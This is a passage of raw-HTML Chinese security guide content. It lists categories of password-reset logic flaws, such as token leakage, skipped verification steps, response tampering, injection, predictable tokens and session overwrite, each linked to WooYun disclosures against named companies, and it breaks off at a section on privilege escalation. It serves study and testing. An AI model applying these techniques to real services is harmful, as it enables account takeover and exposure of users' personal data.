style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="box-sizing: inherit;font-weight: bolder;">邮箱token</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong><span style="color: rgb(255, 104, 39);">WooYun: 身份通任意密码修改-泄漏大量公民信息</span></strong></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">https://wooyun.x10sec.org/static/bugs/wooyun-2012-012572.html</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="box-sizing: inherit;font-weight: bolder;">重置密码token</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong><span style="color: rgb(255, 104, 39);">WooYun: 魅族的账号系统内存在漏洞可导致任意账户的密码重置</span></strong></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">https://wooyun.x10sec.org/static/bugs/wooyun-2014-078208.html</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="box-sizing: inherit;font-weight: bolder;">重新绑定</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong><span style="color: rgb(255, 104, 39);">WooYun: 网易邮箱可直接修改其他用户密码</span></strong></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">https://wooyun.x10sec.org/static/bugs/wooyun-2012-08307.html</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong><span style="color: rgb(255, 104, 39);">WooYun: 如家酒店某严重逻辑漏洞可登陆任意账号可导致几千万敏感信息泄露（涉及任意用户账号个人基本信息、入住记录等）</span></strong></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">https://wooyun.x10sec.org/static/bugs/wooyun-2015-0115537.html</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong><span style="color: rgb(255, 104, 39);">Wooyun: 华住酒店官网某严重逻辑漏洞可登陆任意账号（涉及任意用户账号个人基本信息、入住记录等）</span></strong></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">https://wooyun.x10sec.org/static/bugs/wooyun-2015-0115276.html</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong><span style="color: rgb(255, 104, 39);">WooYun: 12308可修改任意用户密码</span></strong></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">https://wooyun.x10sec.org/static/bugs/wooyun-2014-081467.html</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="box-sizing: inherit;font-weight: bolder;">邮箱绑定</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong><span style="color: rgb(255, 104, 39);">WooYun: 某彩票设计缺陷可修改任意用户密码</span></strong></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">https://wooyun.x10sec.org/static/bugs/wooyun-2015-092319.html</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong><span style="color: rgb(255, 104, 39);">WooYun: 中国工控网任意用户密码重置漏洞</span></strong></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">https://wooyun.x10sec.org/static/bugs/wooyun-2014-086726.html</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="box-sizing: inherit;font-weight: bolder;">服务器验证</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong><span style="color: rgb(255, 104, 39);">WooYun: 携程旅行网任意老板密码修改(庆在wooyun第100洞)</span></strong></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">https://wooyun.x10sec.org/static/bugs/wooyun-2013-018263.html</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="box-sizing: inherit;font-weight: bolder;">服务器验证可控内容</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong><span style="color: rgb(255, 104, 39);">WooYun: AA拼车网之任意密码找回2</span></strong></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">https://wooyun.x10sec.org/static/bugs/wooyun-2014-080278.html</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong><span style="color: rgb(255, 104, 39);">WooYun: 四川我要去哪517旅行网重置任意账号密码漏洞</span></strong></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">https://wooyun.x10sec.org/static/bugs/wooyun-2014-082582.html</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="box-sizing: inherit;font-weight: bolder;">服务器验证验证逻辑为空</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong><span style="color: rgb(255, 104, 39);">WooYun: 某政企使用邮件系统疑似存在通用设计问题</span></strong></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">https://wooyun.x10sec.org/static/bugs/wooyun-2014-088927.html</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="box-sizing: inherit;font-weight: bolder;">用户身份验证</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">账号与手机号码的绑定</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong><span style="color: rgb(255, 104, 39);">WooYun: 上海电信通行证任意密码重置</span></strong></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">https://wooyun.x10sec.org/static/bugs/wooyun-2014-075941.html</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="box-sizing: inherit;font-weight: bolder;">账号与邮箱账号的绑定</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong><span style="color: rgb(255, 104, 39);">WooYun: 魅族的账号系统内存在漏洞可导致任意账户的密码重置</span></strong></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">https://wooyun.x10sec.org/static/bugs/wooyun-2014-078208.html</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong><span style="color: rgb(255, 104, 39);">WooYun: 和讯网修改任意用户密码漏洞</span></strong></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">https://wooyun.x10sec.org/static/bugs/wooyun-2015-091216.html</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="box-sizing: inherit;font-weight: bolder;">找回步骤</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">跳过验证步骤、找回方式，直接到设置新密码页面</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong><span style="color: rgb(255, 104, 39);">WooYun: OPPO手机同步密码随意修改，短信通讯录随意查看</span></strong></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">https://wooyun.x10sec.org/static/bugs/wooyun-2013-042404.html</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong><span style="color: rgb(255, 104, 39);">WooYun: 中国电信某IDC机房信息安全管理系统设计缺陷致使系统沦陷</span></strong></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">https://wooyun.x10sec.org/static/bugs/wooyun-2015-098765.html</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="box-sizing: inherit;font-weight: bolder;">本地验证</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">在本地验证服务器的返回信息，确定是否执行重置密码，但是其返回信息是可控的内容，或者可以得到的内容</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong><span style="color: rgb(255, 104, 39);">WooYun: 看我如何重置乐峰网供应商管理系统任意用户密码（管理员已被重置）</span></strong></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">https://wooyun.x10sec.org/static/bugs/wooyun-2014-083035.html</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong><span style="color: rgb(255, 104, 39);">WooYun: oppo重置任意用户密码漏洞(4)</span></strong></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">https://wooyun.x10sec.org/static/bugs/wooyun-2014-069987.html</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="box-sizing: inherit;font-weight: bolder;">发送短信等验证信息的动作在本地进行，可以通过修改返回包进行控制</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="color: rgb(255, 104, 39);"><strong>WooYun: OPPO修改任意帐号密码-3</strong></span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">https://wooyun.x10sec.org/static/bugs/wooyun-2013-020532.html</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="color: rgb(255, 104, 39);"><strong>WooYun: OPPO修改任意帐号密码-2</strong></span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">https://wooyun.x10sec.org/static/bugs/wooyun-2013-020425.html</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="box-sizing: inherit;font-weight: bolder;">注入</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">在找回密码处存在注入漏洞</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong><span style="color: rgb(255, 104, 39);">WooYun: 用友人力资源管理软件（e-HR）另一处SQL注入漏洞（通杀所有版本）</span></strong></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">https://wooyun.x10sec.org/static/bugs/wooyun-2014-068060.html</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="box-sizing: inherit;font-weight: bolder;">Token生成</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">token生成可控</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong><span style="color: rgb(255, 104, 39);">WooYun: 天天网任意账号密码重置(非暴力温柔修改)</span></strong></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">https://wooyun.x10sec.org/static/bugs/wooyun-2015-094242.html</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="color: rgb(255, 104, 39);"><strong>WooYun: 天天网再一次重置任意账号密码(依旧非暴力)</strong></span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">https://wooyun.x10sec.org/static/bugs/wooyun-2015-095729.html</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="box-sizing: inherit;font-weight: bolder;">注册覆盖</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">注册重复的用户名</p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong><span style="color: rgb(255, 104, 39);">WooYun: 中铁快运奇葩方式重置任意用户密码(admin用户演示)</span></strong></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">https://wooyun.x10sec.org/static/bugs/wooyun-2014-088708.html</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="box-sizing: inherit;font-weight: bolder;">session覆盖</span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="color: rgb(255, 104, 39);"><strong>WooYun: 聚美优品任意修改用户密码(非爆破)</strong></span></p><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">https://wooyun.x10sec.org/static/bugs/wooyun-2014-085843.html</span></p><h4 style="box-sizing: inherit;color: rgb(59, 67, 81);font-weight: bold;line-height: 1.2;margin-bottom: 1rem;margin-top: 1.6rem;padding-bottom: 0.5rem;border-bottom: 1px solid rgb(221, 221, 221);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">越权相关逻辑漏洞</h4><p style="box-sizing: inherit;margin-bottom: 1rem;color: rgb(59, 67, 81);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">越权漏洞是Web应用程序中一种常见的安全漏洞。它的威胁在于一个账户即可控制全站用户数据。当然这些数据仅限于存在漏洞功能对应的数据。越权漏洞的成因主要是因为开发人员在对数据进行增、删、改、查询时对客户端请求的数据过分相信而遗漏了权限的判定。所以测试越权就是和开发人员拼细心的过程。</p><h5 style="box-sizing: inherit;color: rgb(59, 67, 81);font-weight: bold;line-height: 1.2;margin-bottom: 1rem;margin-top: 1.6rem;font-size: 0.875rem;padding-bottom: 0.5rem;border-bottom: 1px solid rgb(221, 221, 221);font family: &quot;Noto Sans TC&quot;, &quot;Noto Sans SC&quot;, &quot;Noto Sans&quot;, sans-serif;text-align: start;white-space: normal;background-color: rgb(255, 255, 